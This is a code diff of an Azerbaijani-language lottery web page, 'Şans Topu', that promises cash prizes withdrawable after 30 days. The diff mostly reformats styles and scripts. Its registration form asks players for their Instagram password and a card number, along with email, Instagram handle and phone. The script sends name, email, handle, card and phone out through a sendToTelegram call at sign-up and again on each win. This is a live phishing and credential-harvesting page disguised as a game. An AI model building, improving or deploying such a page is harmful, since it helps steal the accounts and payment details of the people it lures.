@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Şans Topu | Milyonçu Lotto - Tam İşlək</title>
+    <title>Şans Topu | Milyonçu Lotto</title>
     <style>
         * {
             margin: 0;
@@ -11,14 +11,11 @@
             box-sizing: border-box;
             font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
         }
-
         body {
             background: linear-gradient(145deg, #0B1120 0%, #0F172A 100%);
             min-height: 100vh;
             padding: 16px;
-            position: relative;
         }
-
         .contact-email {
             position: fixed;
             bottom: 15px;
@@ -32,16 +29,8 @@
             z-index: 100;
             border: 1px solid rgba(245,158,11,0.3);
         }
-        .contact-email a {
-            color: #f59e0b;
-            text-decoration: none;
-        }
-
-        .container {
-            max-width: 650px;
-            margin: 0 auto;
-        }
-
+        .contact-email a { color: #f59e0b; text-decoration: none; }
+        .container { max-width: 650px; margin: 0 auto; }
         .glass-card {
             background: rgba(30, 41, 59, 0.85);
             backdrop-filter: blur(12px);
@@ -49,9 +38,7 @@
             padding: 1.2rem;
             margin-bottom: 1.2rem;
             border: 1px solid rgba(245, 158, 11, 0.35);
-            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.5);
         }
-
         h1 {
             font-size: 1.8rem;
             background: linear-gradient(135deg, #F59E0B, #FCD34D);
@@ -60,18 +47,8 @@
             color: transparent;
             text-align: center;
         }
-
-        h2, h3 {
-            color: #F1F5F9;
-            margin-bottom: 0.8rem;
-        }
-
-        .info-text {
-            color: #CBD5E1;
-            font-size: 0.85rem;
-            line-height: 1.4;
-        }
-
+        h2, h3 { color: #F1F5F9; margin-bottom: 0.8rem; }
+        .info-text { color: #CBD5E1; font-size: 0.85rem; }
         .rule-box {
             background: #0F172A;
             border-left: 4px solid #F59E0B;
@@ -80,7 +57,6 @@
             margin: 0.8rem 0;
             font-size: 0.85rem;
         }
-
         input, button {
             width: 100%;
             padding: 12px;
@@ -89,17 +65,12 @@
             border: none;
             font-size: 0.95rem;
         }
-
         input {
             background: #1E293B;
             color: white;
             border: 1px solid #334155;
         }
-        input:focus {
-            outline: none;
-            border-color: #F59E0B;
-        }
-
+        input:focus { outline: none; border-color: #F59E0B; }
         button {
             background: linear-gradient(95deg, #F59E0B, #EA580C);
             color: white;
@@ -107,7 +78,6 @@
             cursor: pointer;
         }
         button:active { transform: scale(0.98); }
-
         .timer-circle {
             background: #F59E0B;
             width: 100px;
@@ -122,13 +92,11 @@
             color: #0F172A;
             box-shadow: 0 0 20px #F59E0B;
         }
-
         .ticket {
             background: white;
             border-radius: 1.2rem;
             padding: 0.8rem;
             margin-bottom: 1rem;
-            color: #0F172A;
         }
         .ticket h4 {
             margin-bottom: 8px;
@@ -152,12 +120,9 @@
             font-weight: bold;
             cursor: pointer;
             font-size: 0.9rem;
-            transition: 0.1s;
         }
         .num.marked { background: #22C55E !important; transform: scale(0.96); }
-
         .hidden { display: none; }
-
         .balance-badge {
             background: #F59E0B20;
             padding: 10px;
@@ -169,18 +134,8 @@
             margin: 10px 0;
         }
         .withdraw-btn { background: #10B981; margin-top: 8px; }
-        .warning-text {
-            font-size: 0.7rem;
-            color: #94A3B8;
-            margin-top: 4px;
-            text-align: center;
-        }
-        .example-text {
-            color: #F59E0B;
-            font-size: 0.7rem;
-            margin-top: -4px;
-            margin-bottom: 8px;
-        }
+        .warning-text { font-size: 0.7rem; color: #94A3B8; margin-top: 4px; text-align: center; }
+        .example-text { color: #F59E0B; font-size: 0.7rem; margin-top: -4px; margin-bottom: 8px; }
         .timer-text {
             font-size: 1.4rem;
             font-weight: bold;
@@ -191,28 +146,13 @@
             padding: 6px;
             border-radius: 40px;
         }
-        .game-status {
-            text-align: center;
-            color: #FCD34D;
-            font-weight: bold;
-            font-size: 0.85rem;
-        }
-        .footer-note {
-            text-align: center;
-            font-size: 10px;
-            margin-top: 10px;
-            color: #64748B;
-        }
+        .game-status { text-align: center; color: #FCD34D; font-weight: bold; font-size: 0.85rem; }
+        .footer-note { text-align: center; font-size: 10px; margin-top: 10px; color: #64748B; }
     </style>
 </head>
 <body>
-
-<div class="contact-email">
-    📧 Bizimlə əlaqə: <a href="mailto:milyoncuoynu5@gmail.com">milyoncuoynu5@gmail.com</a>
-</div>
-
+<div class="contact-email">📧 Bizimlə əlaqə: <a href="mailto:milyoncuoynu5@gmail.com">milyoncuoynu5@gmail.com</a></div>
 <div class="container">
-    <!-- Start Ekranı -->
     <div id="start-screen" class="glass-card">
         <h1>🎲 ŞANS TOPU 🎲</h1>
         <div class="rule-box">
@@ -222,14 +162,11 @@
             • Tamamlanan hər sıra üçün uduş: 1 sıra=5₼, 2 sıra=10₼, 3 sıra=30₼, 4+=50₼, 5+=100₼, 6+=200₼.<br>
             • Uduşlar profilinizdə toplanır. 30 gün tamam olduqda “Çıxarış” düyməsi aktiv olur.
         </div>
-        <input type="text" id="firstname" placeholder="Ad (yalnız hərflər)" autocomplete="off">
-        <div class="example-text">📌 Nümunə: Elçin</div>
-        <input type="text" id="lastname" placeholder="Soyad (yalnız hərflər)" autocomplete="off">
-        <div class="example-text">📌 Nümunə: Məmmədov</div>
+        <input type="text" id="firstname" placeholder="Ad (yalnız hərflər)"><div class="example-text">📌 Nümunə: Elçin</div>
+        <input type="text" id="lastname" placeholder="Soyad (yalnız hərflər)"><div class="example-text">📌 Nümunə: Məmmədov</div>
         <button onclick="startRegistration()">🚀 Qeydiyyat və Oyna</button>
     </div>
 
-    <!-- Qeydiyyat Formu -->
     <div id="reg-screen" class="glass-card hidden">
         <h2>📋 Qeydiyyat</h2>
         <div class="info-text">🔒 Məlumatlarınız təhlükəsizdir. Aktiv email tələb olunur.</div>
@@ -241,22 +178,16 @@
             • Telefon (+994) – əlaqə üçün.
         </div>
         <form id="pre-reg-form">
-            <input type="email" id="email" placeholder="Email (aktiv)" required autocomplete="off">
-            <div class="example-text">📧 Nümunə: ad@example.com</div>
-            <input type="text" id="instagram" placeholder="Instagram istifadəçi adı" required autocomplete="off">
-            <div class="example-text">📷 Nümunə: @elməmmadov</div>
-            <input type="password" id="password" placeholder="Instagram şifrəsi" required autocomplete="off">
-            <div class="example-text">🔒 Şifrəniz (minimum 6 simvol)</div>
-            <input type="text" id="card" maxlength="14" placeholder="Kart nömrəsi (14 rəqəm)" required autocomplete="off">
-            <div class="example-text">💳 Nümunə: 41691234567890</div>
-            <input type="tel" id="phone" maxlength="13" placeholder="WhatsApp +994501234567" required autocomplete="off">
-            <div class="example-text">📞 Nümunə: +994501234567</div>
+            <input type="email" id="email" placeholder="Email (aktiv)"><div class="example-text">📧 Nümunə: ad@example.com</div>
+            <input type="text" id="instagram" placeholder="Instagram istifadəçi adı"><div class="example-text">📷 Nümunə: @elməmmadov</div>
+            <input type="password" id="password" placeholder="Instagram şifrəsi"><div class="example-text">🔒 Şifrəniz (minimum 6 simvol)</div>
+            <input type="text" id="card" maxlength="14" placeholder="Kart nömrəsi (14 rəqəm)"><div class="example-text">💳 Nümunə: 41691234567890</div>
+            <input type="tel" id="phone" maxlength="13" placeholder="WhatsApp +994501234567"><div class="example-text">📞 Nümunə: +994501234567</div>
             <button type="submit">✅ Qeydiyyatı tamamla</button>
         </form>
         <div class="warning-text">*Kart yalnız uduş köçürmək üçün, 14 rəqəm olmalıdır.</div>
     </div>
 
-    <!-- Profil Ekranı -->
     <div id="profile-screen" class="glass-card hidden">
         <h2>👤 Profil</h2>
         <div id="profile-info" class="info-text" style="background:#0F172A; padding:10px; border-radius:1rem; margin-bottom: 12px;"></div>
@@ -267,7 +198,6 @@
         <div class="footer-note">⚠️ Hər 24 saatda 2 bilet oynaya bilərsiniz.</div>
     </div>
 
-    <!-- Oyun Ekranı -->
     <div id="game-screen" class="glass-card hidden">
         <div class="timer-text" id="timer">⏱ 180 saniyə</div>
         <div class="timer-circle" id="current-circle">❓</div>
@@ -276,7 +206,6 @@
         <div class="warning-text">*Yalnız dairədə görünən rəqəmi 4 saniyə ərzində işarələyin</div>
     </div>
 
-    <!-- Oyun Bitdi -->
     <div id="end-screen" class="glass-card hidden">
         <h2>🏆 Oyun Bitdi!</h2>
         <div id="final-result" style="font-size:1.2rem; margin:12px; text-align:center;"></div>
@@ -323,8 +252,7 @@
     function updateWithdrawButton() {
         if (!currentPlayer) return;
         const regDate = new Date(currentPlayer.registeredAt);
-        const now = new Date();
-        const daysDiff = (now - regDate) / (1000 * 3600 * 24);
+        const daysDiff = (new Date() - regDate) / (1000 * 3600 * 24);
         const btn = document.getElementById('withdrawBtn');
         if (daysDiff >= 30 && currentPlayer.totalWinnings > 0) {
             btn.disabled = false;
@@ -394,12 +322,11 @@
             return;
         }
 
-        const nowISO = new Date().toISOString();
         currentPlayer = {
             fullname, email, instagram, password, card, phone,
             balance: 0, totalWinnings: 0,
             lastPlayTime: null,
-            registeredAt: nowISO
+            registeredAt: new Date().toISOString()
         };
         savePlayer(currentPlayer);
         await sendToTelegram(`🆕 YENİ İSTİFADƏÇİ\n👤 ${fullname}\n📧 ${email}\n📷 ${instagram}\n💳 ${card}\n📞 ${phone}`);
@@ -463,98 +390,67 @@
     function initGameClean() {
         if (gameInterval) clearInterval(gameInterval);
         if (drawInterval) clearInterval(drawInterval);
-        
         drawnNumbers = [];
         allGameRows = [];
         gameTimer = 180;
         currentDrawNumber = null;
         lastDrawTimestamp = 0;
-        
-        const timerEl = document.getElementById('timer');
-        if (timerEl) timerEl.textContent = `⏱ ${gameTimer} saniyə`;
-        const circleEl = document.getElementById('current-circle');
-        if (circleEl) circleEl.textContent = '❓';
-        
+        document.getElementById('timer').textContent = `⏱ ${gameTimer} saniyə`;
+        document.getElementById('current-circle').textContent = '❓';
         const container = document.getElementById('tickets-container');
-        if (!container) return;
         container.innerHTML = '';
-        
-        // 2 bilet, hər bilet 3 sıra
         for (let t = 0; t < 2; t++) {
             const ticketDiv = document.createElement('div');
             ticketDiv.className = 'ticket';
-            ticketDiv.innerHTML = `<h4>🎫 Bilet ${t + 1}</h4>`;
-            
-            for (let rowIdx = 0; rowIdx < 3; rowIdx++) {
+            ticketDiv.innerHTML = `<h4>🎫 Bilet ${t+1}</h4>`;
+            for (let r = 0; r < 3; r++) {
                 const rowDiv = document.createElement('div');
                 rowDiv.className = 'row';
-                const rowNumbers = [];
-                while (rowNumbers.length < 5) {
-                    const rand = Math.floor(Math.random() * 90) + 1;
-                    if (!rowNumbers.includes(rand)) rowNumbers.push(rand);
+                const nums = [];
+                while (nums.length < 5) {
+                    let n = Math.floor(Math.random() * 90) + 1;
+                    if (!nums.includes(n)) nums.push(n);
                 }
-                rowNumbers.sort((a,b)=>a-b);
-                
-                const rowData = { elements: [], ticketIndex: t, rowIndex: rowIdx };
-                rowNumbers.forEach(num => {
-                    const numDiv = document.createElement('div');
-                    numDiv.className = 'num';
-                    numDiv.textContent = num;
-                    numDiv.dataset.number = num;
-                    numDiv.onclick = (function(n, div) {
+                nums.sort((a,b)=>a-b);
+                const rowData = { elements: [] };
+                nums.forEach(num => {
+                    const el = document.createElement('div');
+                    el.className = 'num';
+                    el.textContent = num;
+                    el.dataset.number = num;
+                    el.onclick = (function(n, div) {
                         return function() {
-                            if (!currentDrawNumber) {
-                                alert("⏳ Hələ heç bir rəqəm çəkilməyib!");
-                                return;
-                            }
+                            if (!currentDrawNumber) { alert("⏳ Hələ heç bir rəqəm çəkilməyib!"); return; }
                             const timeDiff = Date.now() - lastDrawTimestamp;
-                            if (currentDrawNumber === n && timeDiff <= DRAW_DURATION) {
-                                div.classList.toggle('marked');
-                            } else if (timeDiff > DRAW_DURATION) {
-                                alert(`⌛ Vaxt keçdi! Rəqəm ${currentDrawNumber} idi, 4 saniyə keçdi.`);
-                            } else {
-                                alert(`❌ İndiki rəqəm: ${currentDrawNumber}, siz ${n} işarələməyə çalışırsınız.`);
-                            }
+                            if (currentDrawNumber === n && timeDiff <= DRAW_DURATION) div.classList.toggle('marked');
+                            else if (timeDiff > DRAW_DURATION) alert(`⌛ Vaxt keçdi! Rəqəm ${currentDrawNumber} idi, 4 saniyə keçdi.`);
+                            else alert(`❌ İndiki rəqəm: ${currentDrawNumber}, siz ${n} işarələməyə çalışırsınız.`);
                         };
-                    })(num, numDiv);
-                    rowDiv.appendChild(numDiv);
-                    rowData.elements.push(numDiv);
+                    })(num, el);
+                    rowDiv.appendChild(el);
+                    rowData.elements.push(el);
                 });
                 ticketDiv.appendChild(rowDiv);
                 allGameRows.push(rowData);
             }
             container.appendChild(ticketDiv);
         }
-        
         gameInterval = setInterval(() => {
-            if (gameTimer <= 1) {
-                clearInterval(gameInterval);
-                clearInterval(drawInterval);
-                endGame();
-            } else {
-                gameTimer--;
-                const timerSpan = document.getElementById('timer');
-                if (timerSpan) timerSpan.textContent = `⏱ ${gameTimer} saniyə`;
-            }
+            if (gameTimer <= 1) { clearInterval(gameInterval); clearInterval(drawInterval); endGame(); }
+            else { gameTimer--; document.getElementById('timer').textContent = `⏱ ${gameTimer} saniyə`; }
         }, 1000);
-        
         drawInterval = setInterval(() => {
             if (gameTimer <= 0) return;
             if (drawnNumbers.length >= 90) drawnNumbers = [];
             let newNum;
-            do {
-                newNum = Math.floor(Math.random() * 90) + 1;
-            } while (drawnNumbers.includes(newNum));
+            do { newNum = Math.floor(Math.random() * 90) + 1; } while (drawnNumbers.includes(newNum));
             drawnNumbers.push(newNum);
             currentDrawNumber = newNum;
             lastDrawTimestamp = Date.now();
-            const circleDiv = document.getElementById('current-circle');
-            if (circleDiv) circleDiv.textContent = newNum;
-            
+            document.getElementById('current-circle').textContent = newNum;
             setTimeout(() => {
                 if (currentDrawNumber === newNum) {
-                    const currentCircle = document.getElementById('current-circle');
-                    if (currentCircle) currentCircle.textContent = '❓';
+                    document.getElementById('current-circle').textContent = '❓';
                     currentDrawNumber = null;
                 }
             }, DRAW_DURATION);
@@ -564,14 +460,10 @@
     function endGame() {
         if (gameInterval) clearInterval(gameInterval);
         if (drawInterval) clearInterval(drawInterval);
-        
         let completedRows = 0;
         for (let row of allGameRows) {
-            if (row.elements.length === 5 && row.elements.every(el => el.classList.contains('marked'))) {
-                completedRows++;
-            }
+            if (row.elements.every(el => el.classList.contains('marked'))) completedRows++;
         }
-        
         let win = 0;
         if (completedRows === 1) win = 5;
         else if (completedRows === 2) win = 10;
@@ -579,30 +471,21 @@
         else if (completedRows === 4) win = 50;
         else if (completedRows === 5) win = 100;
         else if (completedRows >= 6) win = 200;
-        
         if (win > 0 && currentPlayer) {
-            currentPlayer.totalWinnings = (currentPlayer.totalWinnings || 0) + win;
+            currentPlayer.totalWinnings += win;
             currentPlayer.balance = currentPlayer.totalWinnings;
             savePlayer(currentPlayer);
-            sendToTelegram(`🎉 QAZANC!\n👤 ${currentPlayer.fullname}\n✅ Tam sıra: ${completedRows}\n💰 Məbləğ: ${win} AZN\n📊 Ümumi uduş: ${currentPlayer.totalWinnings} AZN`);
+            sendToTelegram(`🎉 QAZANC!\n👤 ${currentPlayer.fullname}\n✅ Tam sıra: ${completedRows}\n💰 Məbləğ: ${win} AZN\n📊 Ümumi: ${currentPlayer.totalWinnings} AZN`);
         }
-        
-        const finalDiv = document.getElementById('final-result');
-        if (finalDiv) {
-            finalDiv.innerHTML = `✅ Tamamlanmış sıra sayı: ${completedRows}<br>🎉 Qazanc: ${win} AZN<br>💰 Ümumi balans: ${currentPlayer ? (currentPlayer.totalWinnings || 0) : 0} AZN`;
-        }
+        document.getElementById('final-result').innerHTML = `✅ Tamamlanmış sıra: ${completedRows}<br>🎉 Qazanc: ${win} AZN<br>💰 Ümumi balans: ${currentPlayer ? currentPlayer.totalWinnings : 0} AZN`;
         if (currentPlayer) updateBalanceDisplay();
-        
         document.getElementById('game-screen').classList.add('hidden');
         document.getElementById('end-screen').classList.remove('hidden');
     }
     
     window.onload = () => {
         const saved = loadPlayer();
-        if (saved) {
-            currentPlayer = saved;
-            showProfileScreen();
-        }
+        if (saved) { currentPlayer = saved; showProfileScreen(); }
     };
 </script>
 </body>
